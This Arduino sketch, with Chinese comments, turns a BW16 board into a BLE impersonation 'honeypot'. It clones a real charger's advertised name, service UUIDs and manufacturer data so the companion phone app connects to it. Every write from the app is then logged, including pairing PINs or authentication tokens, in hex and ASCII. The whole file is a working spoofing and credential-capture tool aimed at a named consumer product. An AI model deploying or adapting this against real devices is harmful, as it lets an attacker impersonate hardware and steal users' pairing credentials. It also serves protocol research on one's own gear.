/*
 * BLE 蜜罐/诱捕器 (BLE Honeypot)
 * 目标设备: BW16 (RTL8720DN)
 * 功能: 伪装成"小电拼"设备，捕获App发送的配对PIN码或验证Token
 *
 * 硬件: BW16 (RTL8720DN) - 双频 Wi-Fi + BLE 5.0
 * 框架: Arduino IDE + Realtek Ameba Boards
 * 库: Realtek AmebaBLE
 */

#include <Arduino.h>
#include "BLEDevice.h"
#include "BLEServer.h"
#include "BLEUtils.h"
#include "BLE2902.h"
#include "BLEAdvertising.h"

// ============================================
// 配置区域 - 根据目标设备抓取的参数配置
// ============================================

// 设备广播名称 (必须精确匹配目标设备)
#define DEVICE_NAME "CP02-0002A0"

// 服务 UUID (真实抓取到的 Service UUID)
#define SERVICE_UUID "048E3F2E-E1A6-4707-9E74-A930E898A1EA"

// 特征值 UUID (真实抓取到的 Characteristic UUID)
// Char 1: Notify/Read 属性 (App 可能会先订阅这个)
#define CHARACTERISTIC_UUID_NOTIFY "148E3F2E-E1A6-4707-9E74-A930E898A1EA"
// Char 2: Write 属性 (App 会往这里写数据)
#define CHARACTERISTIC_UUID_WRITE "248E3F2E-E1A6-4707-9E74-A930E898A1EA"

// ============================================
// Manufacturer Data 配置 (厂商数据)
// ============================================
// 格式: 厂商ID (2字节, 小端序) + 数据 (7字节)
// 厂商ID: 0x36E9 (小端序存储为 0xE9 0x36)
// 数据: 0x6C 0x80 0xAB 0x00 0x02 0xA1 0x01
// 总共 9 字节

const uint8_t MANUFACTURER_DATA[] = {
    0xE9, 0x36,             // 厂商 ID (0x36E9, 小端序)
    0x6C, 0x80, 0xAB, 0x00, // 数据部分
    0x02, 0xA1, 0x01        // 数据部分
};

// 串口波特率
#define SERIAL_BAUD 115200

// ============================================
// 全局变量
// ============================================

BLEServer *pServer = nullptr;
BLECharacteristic *pCharNotify = nullptr; // Notify/Read 特征值
BLECharacteristic *pCharWrite = nullptr;  // Write 特征值
bool deviceConnected = false;
bool oldDeviceConnected = false;

// ============================================
// 自定义回调类 - 处理连接/断开事件
// ============================================

class MyServerCallbacks : public BLEServerCallbacks
{
  void onConnect(BLEServer *pServer)
  {
    deviceConnected = true;
    Serial.println("\n========== 连接事件 ==========");
    Serial.println("设备已连接");
    Serial.println("=============================\n");
  }

  void onDisconnect(BLEServer *pServer)
  {
    deviceConnected = false;
    Serial.println("\n========== 断开事件 ==========");
    Serial.println("设备已断开");
    Serial.println("准备重新启动广播...");
    Serial.println("=============================\n");

    // 延迟500ms后重新启动广播
    delay(500);

    // 重新开始广播
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    Serial.println("广播已重新启动，等待新连接...\n");
  }
};

// ============================================
// 自定义回调类 - 处理订阅事件 (Notify 特征值)
// ============================================

class MyNotifyCallbacks : public BLECharacteristicCallbacks
{
  void onWrite(BLECharacteristic *pCharacteristic)
  {
    // 当客户端订阅或取消订阅时，会触发 onWrite 回调
    // 通过检查描述符的值来判断订阅状态
    uint8_t *pData = pCharacteristic->getData();
    if (pData != nullptr && pData[0] == 0x01)
    {
      Serial.println("\n========== 订阅事件 ==========");
      Serial.println("App 已订阅通知 (Notify)");
      Serial.println("===============================\n");
    }
    else if (pData != nullptr && pData[0] == 0x00)
    {
      Serial.println("\n========== 取消订阅 ==========");
      Serial.println("App 已取消订阅通知");
      Serial.println("===============================\n");
    }
  }
};

// ============================================
// 自定义回调类 - 处理数据写入事件 (Write 特征值 - 核心功能)
// ============================================

class MyWriteCallbacks : public BLECharacteristicCallbacks
{
  void onWrite(BLECharacteristic *pCharacteristic)
  {
    std::string value = pCharacteristic->getValue();

    if (value.length() > 0)
    {
      Serial.println("\n==== 捕获到数据 ====");
      Serial.print("Recv: ");

      // 打印十六进制格式 (用于分析二进制Token)
      for (int i = 0; i < value.length(); i++)
      {
        // 每个字节以0xXX格式打印
        char hex[5];
        sprintf(hex, "0x%02X", (uint8_t)value[i]);
        Serial.print(hex);
        if (i < value.length() - 1)
        {
          Serial.print(" ");
        }
      }
      Serial.println();

      // 打印ASCII字符串 (用于查看明文PIN码)
      Serial.print("ASCII: \"");
      for (int i = 0; i < value.length(); i++)
      {
        // 只打印可打印字符 (32-126)
        if (value[i] >= 32 && value[i] <= 126)
        {
          Serial.print(value[i]);
        }
        else
        {
          // 非可打印字符显示为点
          Serial.print(".");
        }
      }
      Serial.println("\"");

      // 打印数据长度
      Serial.print("长度: ");
      Serial.println(value.length());

      // 打印时间戳
      Serial.print("时间戳: ");
      Serial.println(millis());

      Serial.println("====================\n");
    }
  }
};

// ============================================
// 设置函数 - 初始化所有组件
// ============================================

void setup()
{
  // 初始化串口
  Serial.begin(SERIAL_BAUD);
  Serial.println("\n\n");
  Serial.println("========================================");
  Serial.println("  BLE 蜜罐/诱捕器启动中...");
  Serial.println("  目标设备: BW16 (RTL8720DN)");
  Serial.println("========================================\n");

  // 初始化BLE设备
  Serial.println("正在初始化BLE模块...");
  BLEDevice::init(DEVICE_NAME);
  Serial.println("BLE模块初始化完成");

  // 创建BLE服务器
  Serial.println("正在创建BLE服务器...");
  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new MyServerCallbacks());
  Serial.println("BLE服务器创建完成");

  // 创建BLE服务
  Serial.println("正在创建BLE服务...");
  BLEService *pService = pServer->createService(SERVICE_UUID);
  Serial.print("服务UUID: ");
  Serial.println(SERVICE_UUID);

  // 创建 BLE 特征值 1: Notify/Read
  Serial.println("正在创建 BLE 特征值 1 (Notify/Read)...");
  pCharNotify = pService->createCharacteristic(
      CHARACTERISTIC_UUID_NOTIFY,
      BLECharacteristic::PROPERTY_READ |
          BLECharacteristic::PROPERTY_NOTIFY);
  Serial.print("特征值 1 UUID: ");
  Serial.println(CHARACTERISTIC_UUID_NOTIFY);
  Serial.println("特征值 1 属性: READ | NOTIFY");

  // 添加描述符 (必需，用于通知订阅)
  pCharNotify->addDescriptor(new BLE2902());

  // 设置回调 (用于检测订阅事件)
  pCharNotify->setCallbacks(new MyNotifyCallbacks());

  // 设置初始值
  pCharNotify->setValue("Ready");

  // 创建 BLE 特征值 2: Write
  Serial.println("正在创建 BLE 特征值 2 (Write)...");
  pCharWrite = pService->createCharacteristic(
      CHARACTERISTIC_UUID_WRITE,
      BLECharacteristic::PROPERTY_WRITE |
          BLECharacteristic::PROPERTY_WRITE_WITHOUT_RESPONSE);
  Serial.print("特征值 2 UUID: ");
  Serial.println(CHARACTERISTIC_UUID_WRITE);
  Serial.println("特征值 2 属性: WRITE | WRITE_NO_RESPONSE");

  // 设置回调 (用于捕获写入的数据)
  pCharWrite->setCallbacks(new MyWriteCallbacks());

  // 设置初始值
  pCharWrite->setValue("");

  // 启动服务
  Serial.println("正在启动服务...");
  pService->start();
  Serial.println("服务启动完成");

  // 配置广播参数
  Serial.println("正在配置广播参数...");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

  // 添加服务 UUID 到广播包
  pAdvertising->addServiceUUID(SERVICE_UUID);

  // 设置设备名称
  pAdvertising->setName(DEVICE_NAME);

  // 添加 Manufacturer Data (厂商数据) - 关键伪装步骤
  // 这部分数据会被放入扫描响应包 (Scan Response Data)
  // 防止 App 通过厂商 ID 过滤设备
  Serial.println("正在设置 Manufacturer Data...");
  Serial.print("厂商数据 (HEX): ");
  for (int i = 0; i < sizeof(MANUFACTURER_DATA); i++)
  {
    Serial.print("0x");
    Serial.print(MANUFACTURER_DATA[i], HEX);
    if (i < sizeof(MANUFACTURER_DATA) - 1)
    {
      Serial.print(" ");
    }
  }
  Serial.println();
  pAdvertising->setManufacturerData(MANUFACTURER_DATA, sizeof(MANUFACTURER_DATA));

  // 启用扫描响应
  pAdvertising->setScanResponse(true);

  // 设置广播间隔参数
  pAdvertising->setMinPreferred(0x06); // 最小间隔 (6 * 0.625ms = 3.75ms)
  pAdvertising->setMaxPreferred(0x12); // 最大间隔 (18 * 0.625ms = 11.25ms)

  // 开始广播
  Serial.println("正在启动广播...");
  pAdvertising->start();
  Serial.println("广播已启动");

  Serial.println("\n========================================");
  Serial.println("  BLE 蜜罐运行中!");
  Serial.print("  设备名称: ");
  Serial.println(DEVICE_NAME);
  Serial.print("  Service UUID: ");
  Serial.println(SERVICE_UUID);
  Serial.print("  特征值 1 (Notify/Read): ");
  Serial.println(CHARACTERISTIC_UUID_NOTIFY);
  Serial.print("  特征值 2 (Write): ");
  Serial.println(CHARACTERISTIC_UUID_WRITE);
  Serial.print("  厂商 ID: 0x36E9\n");
  Serial.println("  等待手机App连接...");
  Serial.println("========================================\n");
}

// ============================================
// 主循环 - 处理连接状态
// ============================================

void loop()
{
  // 检测连接状态变化
  if (!deviceConnected && oldDeviceConnected)
  {
    // 设备刚刚断开连接
    delay(500); // 给蓝牙协议栈一些时间
    oldDeviceConnected = deviceConnected;
  }

  // 检测新连接
  if (deviceConnected && !oldDeviceConnected)
  {
    // 设备刚刚连接
    oldDeviceConnected = deviceConnected;
  }

  // 主循环可以添加其他功能
  delay(100);
}
